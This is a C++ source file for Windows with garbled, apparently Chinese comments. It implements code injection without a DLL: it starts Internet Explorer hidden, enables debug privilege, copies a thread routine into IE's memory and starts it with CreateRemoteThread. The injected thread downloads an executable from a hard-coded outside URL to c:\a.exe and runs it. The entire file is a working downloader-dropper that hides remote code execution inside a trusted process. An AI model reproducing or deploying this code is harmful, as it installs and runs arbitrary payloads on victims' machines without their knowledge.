// InjectNoDll.cpp : Defines the entry point for the application.
//

#include "stdafx.h"

#include <tlhelp32.h>
#include<stdio.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#include <shellapi.h>

typedef struct _RemotePara
{
	//�����ļ���url
	char Url[255];
	//�����ļ���·��
	char FilePath[255];
	//URLDownloadToFile�����ĵ�ַ
	DWORD DownAddr;
	//WinexeC�����ĵ�ַ
	DWORD ExecAddr;
}RemotePara;

DWORD __stdcall ThreadProc(RemotePara *lpPara)
{
	//����WinexeC������ԭ��
	typedef UINT (__stdcall *MWinExec)(LPCSTR lpCmdLine, UINT uCmdShow); 
	//����URLDownloadToFile������ԭ��
	typedef HRESULT (__stdcall *MURLDownloadToFile)(LPUNKNOWN pCaller, 
		LPCTSTR szURL, LPCTSTR szFileName, 
		DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB);
	MURLDownloadToFile myURLDownloadToFile;
    //�ӽṹ�еõ�URLDownloadToFile�����ĵ�ַ
	myURLDownloadToFile=(MURLDownloadToFile)lpPara->DownAddr;
	//���ú��������ļ�
    myURLDownloadToFile(0,lpPara->Url,lpPara->FilePath,0,0);
	MWinExec myWinExec;
	//�ӽṹ�еõ�WinexeC�����ĵ�ַ
	myWinExec=(MWinExec)lpPara->ExecAddr;
	//���ú����������ص��ļ�
	myWinExec(lpPara->FilePath,1);
	return 0;
}


DWORD GetProcessID(char *ProcessName)
{
	PROCESSENTRY32 pe32;
	pe32.dwSize=sizeof(pe32);
	//���ϵͳ�����н��̿���
	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(hProcessSnap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot error");
		return 0;
	}
	//ö���б��еĵ�һ������
	BOOL bProcess=Process32First(hProcessSnap,&pe32);
	while(bProcess)
	{
		//�Ƚ��ҵ��Ľ�����������Ҫ���ҵĽ�������һ���򷵻ؽ���id
		if(strcmp(strupr(pe32.szExeFile),strupr(ProcessName))==0)
			return pe32.th32ProcessID;
		//��������
		bProcess=Process32Next(hProcessSnap,&pe32);
	}
	CloseHandle(hProcessSnap);
	return 0;
}

int EnableDebugPriv(const char * name)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	//�򿪽������ƻ�
	if(!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,
		&hToken) )
	{
		printf("OpenProcessToken error\n");
		return 1;
	}
	//��ý��̱���ΨһID
	if(!LookupPrivilegeValue(NULL,name,&luid))
	{
		printf("LookupPrivilege error!\n");
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes =SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;
	//��������Ȩ��
	if(!AdjustTokenPrivileges(hToken,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL) )
	{
		printf("AdjustTokenPrivileges error!\n");
		return 1;
	}
	return 0;
}

BOOL Inject(const DWORD dwRemoteProcessId)
{
	//��������Ȩ��Ϊ����Ȩ��
	if(EnableDebugPriv(SE_DEBUG_NAME))
	{
		printf("add privilege error");
		return FALSE;
	}
	//�򿪽���
	HANDLE hWnd=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwRemoteProcessId);
	if (!hWnd)
	{
		printf("OpenProcess failed");
		return FALSE;
	}
	//�����ڴ�ռ�
	void *pRemoteThread= VirtualAllocEx(hWnd, 0,
		1024*4, MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (!pRemoteThread)
	{
		printf("VirtualAllocEx failed");
		
		return FALSE;
	}
	//��Զ���ֳ��Ǹ�����д���ڴ�
	if (!WriteProcessMemory(hWnd,pRemoteThread,&ThreadProc,1024*4,0))
	{
		printf("WriteProcessMemory failed");
		return FALSE;
	}
	//��дRemotePara�ṹ
	RemotePara myRemotePara;
	ZeroMemory(&myRemotePara,sizeof(RemotePara));
	HINSTANCE hurlmon=LoadLibrary("urlmon.dll");
	HINSTANCE kernel=LoadLibrary("kernel32.dll");
	myRemotePara.DownAddr=(DWORD)GetProcAddress(hurlmon,"URLDownloadToFileA");
	myRemotePara.ExecAddr=(DWORD)GetProcAddress(kernel,"WinExec");
	char urlfile[255];
	strcpy(urlfile,"http://www.snow1987.cn/a.exe");
	strcpy(myRemotePara.Url,urlfile);
	strcpy(myRemotePara.FilePath,"c:\\a.exe");
	//�����ڴ�ռ�
	RemotePara *pRemotePara=(RemotePara *)VirtualAllocEx(hWnd,0,sizeof(RemotePara),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if (!pRemotePara)
	{
		printf("VirtualAllocEx failed");
		
		return FALSE;
	}
	//д���ڴ�
	if (!WriteProcessMemory(hWnd,pRemotePara,&myRemotePara,sizeof(myRemotePara),0))
	{
		printf("WriteProcessMemory failed");
		return FALSE;
	}
	//�����߳�
	HANDLE hThread=CreateRemoteThread(hWnd,0,0,(LPTHREAD_START_ROUTINE)pRemoteThread,pRemotePara,0,0);
	if (!hThread)
	{
		printf("CreateRemoteThread failed");
		
		return FALSE;
	}
	return true;
}
	




int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	char Path[255];
	//�õ�widnowsϵͳ·��
    GetSystemDirectory(Path,sizeof(Path));
	//0x00�ض��ַ����õ��̷�
	Path[3]=0x00;
	//�õ�IE��·���ļ���
	strcat(Path,"Program Files\\Internet Explorer\\iexplore.exe");
	//����IE��Ϊ�˷�ֹϵͳ��û��IE����
    WinExec(Path,SW_HIDE);
	//��ͣ���룬�ȴ�IE����
	Sleep(2000);
	//�õ�IE����
	DWORD Pid=GetProcessID("iexplore.exe");
    Inject(Pid);
    
	return 0;
}



